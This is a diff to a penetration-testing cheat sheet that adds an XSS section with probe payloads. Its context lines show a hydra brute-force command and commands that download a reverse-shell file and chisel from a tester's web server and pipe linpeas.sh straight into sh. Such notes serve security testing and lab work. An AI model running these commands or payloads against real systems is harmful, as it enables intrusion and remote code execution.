@@ -59,3 +59,16 @@ so an example command is as follows `hydra -l admin -P /usr/share/wordlists/rock
 1. Start a simple web server from current working directory `python3 -m http.server 8000`
   - Download a file from aforementioned simple web server `wget http://10.x.x.x:8000/revsh.php` or `curl -O http://10.x.x.x:8000/chisel`
   - Run a file from aforementioned simple web server `curl http://10.x.x.x:8000/linpeas.sh | sh`
+
+## Web App Testing
+### XSS
+The first thing to do is to look for parameters or input fields on the page, put your unique and easy to find test data in (And submit it or whatever) and then inspect the resultant page to see wher your test data has ended up in the code. Understanding the context where it ends up will determine what type of payload you'll need to use (Try things like ending the tag that it ends up in for example)
+#### Payloads
+- `"><u>ghostbugg`
+- `<script>alert(1337)</script>`
+- `<script>alert(1337);//</script>`
+- `<img src=xxxx onerror=alert(1337)>`
+- `<a href=javascript:alert(1337)>ghostbugg`
+- `<iframe src=javascript:alert(1337)>`
+- `<object data="data:text/html,<script>alert(1337)</script>"></object>`
+- `<script src=data:text/javascript,alert(1337)></script>`
